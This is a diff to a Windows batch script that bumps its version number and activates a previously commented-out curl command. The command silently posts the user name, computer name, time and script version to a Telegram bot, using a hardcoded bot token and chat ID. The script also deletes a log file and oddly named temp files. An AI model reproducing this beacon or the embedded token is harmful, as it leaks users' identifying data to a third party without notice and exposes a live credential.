@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=23.3"
+set "BATCHVERSION=23.4"
 
 
 
@@ -90,7 +90,7 @@ del /f /q "%LOGFILE%"
 echo.
 echo.
 echo Exiting...
-::curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)|DONEE"
+curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)|DONEE"
 del /q %temp%\*.mpee
 del /q %temp%\*.qwb
 goto :EOF
